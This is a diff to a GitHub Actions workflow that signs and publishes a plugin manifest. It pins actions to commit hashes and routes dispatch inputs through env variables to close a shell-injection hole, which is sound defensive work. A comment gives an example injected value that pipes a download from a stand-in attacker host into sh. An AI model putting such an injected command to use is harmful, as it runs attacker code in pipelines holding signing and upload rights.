@@ -21,8 +21,8 @@ jobs:
   publish:
     runs-on: ubuntu-latest
     steps:
-      - uses: actions/checkout@v5
-      - uses: actions/setup-go@v6
+      - uses: actions/checkout@93cb6efe18208431cddfb8368fd83d5badbf9bfd # v5
+      - uses: actions/setup-go@4a3601121dd01d1626a1e23e37211e3254c1c06c # v6
         with:
           go-version: '1.22'
           cache: true
@@ -31,27 +31,37 @@ jobs:
         run: go build -o bin/hint-build ./cmd/hint-build
 
       # 1. Assume the OIDC hub role — has kms:Sign on the manifest signing key.
-      - uses: aws-actions/configure-aws-credentials@v5
+      - uses: aws-actions/configure-aws-credentials@61815dcd50bd041e203e49132bacad1fd04d2708 # v5
         with:
           role-to-assume: ${{ vars.AWS_ROLE_ARN }}
           aws-region: ${{ vars.AWS_REGION }}
 
+      # ${{ ... }} expressions are interpolated into the shell *before* the
+      # shell parses the line, so workflow_dispatch inputs would be a literal
+      # injection vector (an attacker who can trigger the workflow could pass
+      # `foo.toml; curl evil.example | sh`). Pass user-controlled inputs
+      # through env: instead so the shell sees them as ordinary $VAR values.
       - name: Sign manifest
+        env:
+          MANIFEST_PATH: ${{ inputs.manifest_path }}
+          KMS_KEY_ID: ${{ vars.KMS_KEY_ID }}
         run: |
           ./bin/hint-build sign \
-            --manifest "${{ inputs.manifest_path }}" \
-            --kms-key-id "${{ vars.KMS_KEY_ID }}"
+            --manifest "$MANIFEST_PATH" \
+            --kms-key-id "$KMS_KEY_ID"
 
       - name: Verify locally before publishing
+        env:
+          MANIFEST_PATH: ${{ inputs.manifest_path }}
         run: |
           ./bin/hint-build verify \
-            --manifest "${{ inputs.manifest_path }}" \
+            --manifest "$MANIFEST_PATH" \
             --pubkey cmd/hint/pubkey.pem
 
       # 2. Chain into the registry-publish spoke role — has s3:PutObject on the
       # registry bucket + cloudfront:CreateInvalidation on the distribution.
       # The hub-role creds from step 1 are used to assume this spoke role.
-      - uses: aws-actions/configure-aws-credentials@v5
+      - uses: aws-actions/configure-aws-credentials@61815dcd50bd041e203e49132bacad1fd04d2708 # v5
         with:
           role-to-assume: ${{ vars.REGISTRY_PUBLISH_ROLE_ARN }}
           aws-region: ${{ vars.AWS_REGION }}
@@ -62,12 +72,17 @@ jobs:
           role-skip-session-tagging: true
 
       - name: Upload to registry
+        env:
+          MANIFEST_PATH: ${{ inputs.manifest_path }}
+          REGISTRY_S3_BUCKET: ${{ vars.REGISTRY_S3_BUCKET }}
         run: |
-          aws s3 cp "${{ inputs.manifest_path }}"     "s3://${{ vars.REGISTRY_S3_BUCKET }}/cli/plugins.toml"
-          aws s3 cp "${{ inputs.manifest_path }}.sig" "s3://${{ vars.REGISTRY_S3_BUCKET }}/cli/plugins.toml.sig"
+          aws s3 cp "$MANIFEST_PATH"     "s3://$REGISTRY_S3_BUCKET/cli/plugins.toml"
+          aws s3 cp "${MANIFEST_PATH}.sig" "s3://$REGISTRY_S3_BUCKET/cli/plugins.toml.sig"
 
       - name: Invalidate CDN cache for manifest
+        env:
+          DISTRIBUTION_ID: ${{ vars.REGISTRY_CDN_DISTRIBUTION_ID }}
         run: |
           aws cloudfront create-invalidation \
-            --distribution-id "${{ vars.REGISTRY_CDN_DISTRIBUTION_ID }}" \
+            --distribution-id "$DISTRIBUTION_ID" \
             --paths "/cli/plugins.toml" "/cli/plugins.toml.sig"
